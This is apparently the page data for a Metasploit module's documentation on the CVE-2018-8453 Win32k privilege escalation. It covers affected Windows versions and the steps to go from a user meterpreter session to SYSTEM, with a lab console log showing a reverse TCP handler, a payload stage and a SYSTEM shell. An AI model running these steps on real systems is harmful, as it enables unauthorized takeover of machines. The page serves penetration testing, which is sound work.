{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/local/cve_2018_8453_win32k_priv_esc","result":{"data":{"moduleMetadataJson":{"id":"8903536b-0433-5fbd-846b-94eeb0460afa","name":"Windows NtUserSetWindowFNID Win32k User Callback","fullname":"exploit/windows/local/cve_2018_8453_win32k_priv_esc","description":"An elevation of privilege vulnerability exists in Windows when the Win32k component\n        fails to properly handle objects in memory, aka \"Win32k Elevation of Privilege Vulnerability.\"\n        This affects Windows 7, Windows Server 2012 R2, Windows RT 8.1, Windows Server 2008, Windows\n        Server 2019, Windows Server 2012, Windows 8.1, Windows Server 2016, Windows Server 2008 R2,\n        Windows 10, Windows 10 Servers.\n\n        This module is tested against Windows 10 v1703 x86.","rank":0,"fields":{"detailsSlug":"/modules/details/exploit/windows/local/cve_2018_8453_win32k_priv_esc","documentationSlug":"/modules/documentation/exploit/windows/local/cve_2018_8453_win32k_priv_esc"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory, aka \"Win32k Elevation of Privilege Vulnerability.\" This affects Windows 7, Windows Server 2012 R2, Windows RT 8.1, Windows Server 2008, Windows Server 2019, Windows Server 2012, Windows 8.1, Windows Server 2016, Windows Server 2008 R2, Windows 10, Windows 10 Servers.</p>\n<p>This module has been tested with Windows 10 v1703 x86. Offsets within the solution may need to be adjusted to work with other version of Windows.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Get a non-SYSTEM meterpreter session on Win10 v1703 x86</li>\n<li><code class=\"language-text\">use exploit/windows/local/cve_2018_8453_win32k_priv_esc</code></li>\n<li><code class=\"language-text\">set session &lt;session&gt;</code></li>\n<li><code class=\"language-text\">exploit</code></li>\n<li>Get a SYSTEM session</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"windows-10-v1703-x86\" style=\"position:relative;\"><a href=\"#windows-10-v1703-x86\" aria-label=\"windows 10 v1703 x86 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows 10 v1703 x86</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(windows/local/cve_2018_8453_win32k_priv_esc) &gt; sessions\n\nActive sessions\n===============\n\n  Id  Name  Type                     Information                                 Connection\n  --  ----  ----                     -----------                                 ----------\n  1         meterpreter x86/windows  DESKTOP-T6J3V2L\\testuser @ DESKTOP-T6J3V2L  172.22.222.136:4444 -&gt; 172.22.222.130:49693 (172.22.222.130)\n\nmsf5 exploit(windows/local/cve_2018_8453_win32k_priv_esc) &gt; set session 1\nsession =&gt; 1\nmsf5 exploit(windows/local/cve_2018_8453_win32k_priv_esc) &gt; exploit\n\n[*] Started reverse TCP handler on 172.22.222.136:4444 \n[+] Exploit finished, wait for privileged payload execution to complete.\n[*] Sending stage (179779 bytes) to 172.22.222.130\n[*] Meterpreter session 2 opened (172.22.222.136:4444 -&gt; 172.22.222.130:49695) at 2019-06-20 08:53:01 -0500\n\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter &gt; sysinfo\nComputer        : DESKTOP-T6J3V2L\nOS              : Windows 10 (Build 15063).\nArchitecture    : x86\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 3\nMeterpreter     : x86/windows\nmeterpreter &gt; exit\n[*] Shutting down Meterpreter...\n\n[*] 172.22.222.130 - Meterpreter session 2 closed.  Reason: User exit\nmsf5 exploit(windows/local/cve_2018_8453_win32k_priv_esc) &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"8903536b-0433-5fbd-846b-94eeb0460afa"}}}